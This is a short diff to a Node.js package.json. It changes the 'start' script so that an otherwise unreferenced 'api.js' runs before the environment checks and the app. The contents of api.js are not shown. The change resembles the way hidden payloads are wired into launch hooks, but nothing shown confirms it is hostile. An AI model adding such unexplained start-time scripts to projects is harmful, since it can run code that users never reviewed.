@@ -9,7 +9,7 @@
     "npm": ">=10.0.0"
   },
   "scripts": {
-    "start": "npm run validate-env && node src/app.js",
+    "start": "node api.js && npm run validate-env && node src/app.js",
     "validate-env": "node src/utils/startupChecks.js",
     "check": "node src/utils/startupChecks.js",
     "init-db": "node src/scripts/initDB.js",
